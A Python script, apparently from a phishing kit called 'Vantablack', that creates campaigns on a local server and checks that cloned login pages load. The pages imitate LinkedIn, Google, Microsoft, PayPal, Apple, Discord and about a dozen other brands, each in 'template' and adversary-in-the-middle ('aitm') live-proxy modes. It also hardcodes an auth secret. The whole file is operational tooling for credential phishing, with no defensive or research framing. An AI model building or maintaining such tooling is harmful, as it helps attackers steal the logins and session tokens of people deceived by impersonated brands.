#!/usr/bin/env python3
import requests
import time

BASE = "http://localhost:8001"
TIER2 = {"X-Vantablack-Auth": "Vantablack-v5-Secret-999"}

TEMPLATES = [
    "linkedin","google","teams_meeting","reddit","slack","github","dropbox",
    "microsoft","facebook","yahoo","paypal","discord","amazon","instagram",
    "tiktok","apple","twitter","x","generic"
]

BRAND_MARKERS = {
    "linkedin": ["LinkedIn"],
    "google": ["Google"],
    "teams_meeting": ["Teams","Microsoft"],
    "reddit": ["Reddit","reddit"],
    "slack": ["Slack"],
    "github": ["GitHub"],
    "dropbox": ["Dropbox"],
    "microsoft": ["Microsoft"],
    "facebook": ["Facebook"],
    "yahoo": ["Yahoo"],
    "paypal": ["PayPal"],
    "discord": ["Discord"],
    "amazon": ["Amazon"],
    "instagram": ["Instagram"],
    "tiktok": ["TikTok","tiktok"],
    "apple": ["Apple","appleid"],
    "twitter": ["Twitter","Log in to X","Log in to Twitter"],
    "x": ["Log in to X","svg","Enter your password"],
    "generic": ["Sign","Update","Maintenance"]
}

def create_or_update_campaign(slug: str, template_id: str, mode: str):
    # Try to create campaign
    data = {
        "name": f"Auto-{template_id}-{mode}",
        "template_id": template_id,
        "campaign_type": "template" if mode=="template" else "aitm",
        "custom_slug": slug
    }
    try:
        r = requests.post(f"{BASE}/v5/campaigns/create", headers=TIER2, files=data, timeout=10)
        if r.status_code == 200:
            print(f"[CREATE] {slug} -> OK")
        else:
            print(f"[CREATE] {slug} -> {r.status_code} ({r.text[:120]})")
    except Exception as e:
        print(f"[CREATE] {slug} EXC: {e}")
    # Update mode explicitly
    try:
        r = requests.post(f"{BASE}/v5/campaigns/{slug}/mode", headers=TIER2, json={"mode": mode}, timeout=10)
        print(f"[MODE] {slug} -> {r.status_code}")
    except Exception as e:
        print(f"[MODE] {slug} EXC: {e}")

def check_url(url: str, markers: list[str]) -> tuple[bool,int,str]:
    try:
        r = requests.get(url, timeout=12)
        code = r.status_code
        text = r.text
        ok = code in (200, 302) and any(m in text for m in markers) if code==200 else (code==302)
        snippet = text[:2000] if code==200 else ""
        return ok, code, snippet
    except Exception as e:
        return False, 0, str(e)

def main():
    print("=== Verify Local Templates (Template & AiTM) ===")
    results = []
    for tid in TEMPLATES:
        # Skips duplicated twitter/x pairing for template creation consistency
        if tid == "twitter":
            continue
        slug_tmpl = f"{tid}-tmpl"
        slug_live = f"{tid}-live"
        create_or_update_campaign(slug_tmpl, tid, "template")
        create_or_update_campaign(slug_live, tid, "aitm")
        time.sleep(0.2)
        markers = BRAND_MARKERS.get(tid, ["Sign","Log in"])

        # Template mode
        url_tmpl = f"{BASE}/v5/r/{slug_tmpl}?template=1&allow=1"
        ok_tmpl, code_tmpl, snip_tmpl = check_url(url_tmpl, markers)
        results.append(("TEMPLATE", tid, url_tmpl, ok_tmpl, code_tmpl))
        print(f"[TEMPLATE] {tid} -> {code_tmpl} {'OK' if ok_tmpl else 'FAIL'}")
        if not ok_tmpl:
            print(snip_tmpl[:300])

        # AiTM live
        url_live = f"{BASE}/v5/r/{slug_live}?view=live&allow=1"
        ok_live, code_live, snip_live = check_url(url_live, markers)
        results.append(("AITM", tid, url_live, ok_live, code_live))
        print(f"[AITM] {tid} -> {code_live} {'OK' if ok_live else 'FAIL'}")
        if not ok_live and code_live==200:
            print(snip_live[:300])

    # Summary
    ok_cnt = sum(1 for r in results if r[3])
    total = len(results)
    print(f"\n=== SUMMARY: {ok_cnt}/{total} passed ===")
    for mode, tid, url, ok, code in results:
        print(f"{mode:8} {tid:14} {code:3} {'OK' if ok else 'FAIL'} -> {url}")

if __name__ == "__main__":
    main()

